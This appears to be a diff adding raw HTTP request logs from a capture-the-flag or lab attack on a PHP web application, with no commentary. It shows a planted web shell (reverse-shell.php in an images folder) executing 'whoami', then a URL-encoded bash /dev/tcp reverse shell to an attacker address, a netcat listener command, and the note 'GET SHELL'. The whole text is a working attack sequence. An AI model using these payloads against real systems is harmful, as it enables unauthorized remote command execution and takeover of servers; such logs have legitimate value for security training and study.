@@ -1,0 +1,40 @@
+GET /rms/images/reverse-shell.php?cmd=whoami HTTP/1.1
+Host: 10.10.92.42:12340
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: PHPSESSID=31uu40id6trrt43uddtg9e5rg4
+Upgrade-Insecure-Requests: 1
+
+
+RESPONSE::
+
+HTTP/1.1 200 OK
+Date: Fri, 29 Dec 2023 12:48:58 GMT
+Server: Apache/2.4.6 (CentOS) PHP/5.4.16
+X-Powered-By: PHP/5.4.16
+Content-Length: 7
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
+apache
+
+
+GET /rms/images/reverse-shell.php?cmd=bash+-i+>%26+/dev/tcp/10.8.123.104/9001+0>%261 HTTP/1.1
+Host: 10.10.92.42:12340
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Connection: close
+Cookie: PHPSESSID=31uu40id6trrt43uddtg9e5rg4
+Upgrade-Insecure-Requests: 1
+
+
+
+
+nc -nlvp 9001
+
+GET SHELL
